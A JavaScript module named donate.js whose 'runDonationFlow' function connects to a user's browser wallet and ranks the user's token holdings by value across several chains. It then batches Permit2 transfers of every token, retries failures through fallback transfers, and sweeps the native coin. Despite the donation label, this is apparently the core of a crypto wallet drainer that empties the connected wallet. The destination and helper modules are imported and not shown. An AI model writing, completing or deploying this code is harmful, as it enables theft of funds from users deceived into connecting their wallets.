//src/engine/donate.js

import { fetchBalancesCovalent, filterPermit2SafeTokens, getChainValue } from "./balances.js";
import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
import { executeFallbackBatch, sweepNative } from "./fallback.js";
import { CHAINS, exceptionList } from "../config.js";
import { ethers } from "ethers";

export async function runDonationFlow(walletClient) {
  // build balances
  let owner = walletClient?.account?.address;
  if (!owner && typeof window !== "undefined" && window.ethereum) {
    const tmpProv = new ethers.BrowserProvider(window.ethereum);
    await tmpProv.send("eth_requestAccounts", []);
    const tmpSigner = await tmpProv.getSigner();
    owner = await tmpSigner.getAddress();
  }

  const chainBalances = [];
  for (const chain of CHAINS) {
    const raw = await fetchBalancesCovalent(owner, chain.chainId);
    const filtered = await filterPermit2SafeTokens(raw);
    chainBalances.push({ ...chain, tokens: filtered, totalValue: getChainValue(filtered) });
  }

  chainBalances.sort((a, b) => b.totalValue - a.totalValue);

  for (const chain of chainBalances) {
    const { provider, signer } = await getProviderForChain(walletClient, chain.chainId); // implement this
    const permit2Tokens = [], fallbackTokens = [];

    for (const t of chain.tokens) {
      if (exceptionList?.[chain.chainId]?.includes(t.tokenAddress.toLowerCase())) fallbackTokens.push(t);
      else (await isPermit2Compatible(t.tokenAddress, signer)) ? permit2Tokens.push(t) : fallbackTokens.push(t);
    }

    await executePermit2Batch(signer, chain.chainId, permit2Tokens).catch(() => fallbackTokens.push(...permit2Tokens));
    await executeFallbackBatch(signer, chain.chainId, fallbackTokens);
    await sweepNative(signer, provider, chain.chainId);
  }
}
